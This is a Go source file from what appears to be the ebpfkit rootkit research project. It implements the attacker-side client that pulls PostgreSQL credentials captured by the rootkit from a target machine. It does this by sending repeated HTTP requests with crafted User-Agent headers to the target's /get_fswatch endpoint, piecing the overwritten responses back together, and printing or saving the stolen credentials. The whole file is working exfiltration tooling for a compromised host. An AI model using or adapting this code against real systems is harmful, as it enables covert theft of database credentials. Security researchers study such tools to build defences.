/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package postgres

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httputil"
	"os"
	"path"
	"strings"

	"github.com/sirupsen/logrus"
)

// SendGetPostgresSecretsListRequest sends a request list all the postgresql secrets detected by the rootkit
func SendGetPostgresSecretsListRequest(target string, output string) error {
	if len(output) > 0 {
		d := path.Dir(output)
		_ = os.MkdirAll(d, 0664)
		f, err := os.Create(output)
		if err != nil {
			logrus.Fatalf("couldn't create output file: %s", err)
		}
		_ = f.Close()
	}

	file := "/ebpfkit/pg_credentials"
	nextFile := "/ebpfkit/pg_credentials"
	var done bool
	var data string
	firstTry := true

	for !done {
		client := &http.Client{}
		req, err := http.NewRequest("GET", target+"/get_fswatch", nil)
		if err != nil {
			logrus.Fatalf("couldn't create HTTP request: %v", err)
		}

		req.Header.Set("User-Agent", buildFSWatchUserAgent(nextFile, false, false))

		if file == nextFile && firstTry {
			firstTry = false
			b, _ := httputil.DumpRequest(req, true)
			logrus.Debugf("\n%s", b)
		}

		resp, err := client.Do(req)
		if err != nil {
			logrus.Fatalf("couldn't send HTTP request: %v", err)
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			logrus.Fatalf("couldn't read HTTP response: %v", err)
		}

		if !isResponseValid(body) {
			continue
		}

		data += strings.Join(strings.Split(strings.Trim(string(body[:len(body)-6]), "_"), "#"), " ")

		if body[len(body)-5] == '_' {
			done = true
			continue
		}

		nextFile = fmt.Sprintf("%s%s", string(body[len(body)-4:]), nextFile[4:])
		client.CloseIdleConnections()
	}

	if len(output) == 0 {
		logrus.Printf("Showing the list of Postgresql credentials detected on the target system:\n%s\n", data)
	} else {
		if err := ioutil.WriteFile(output, []byte(data), 0664); err != nil {
			logrus.Fatalf("couldn't write data in output file: %s", err)
		}
	}
	return nil
}

func isResponseValid(body []byte) bool {
	if len(body) < 5 {
		return false
	}

	// check that the request was properly overwritten, otherwise retry
	nextOpChar := body[len(body)-5]
	if nextOpChar != '_' && nextOpChar != '#' {
		return false
	}
	for _, elem := range body[len(body)-4:] {
		if elem != '_' && elem < 65 && elem > 90 {
			return false
		}
	}
	return true
}
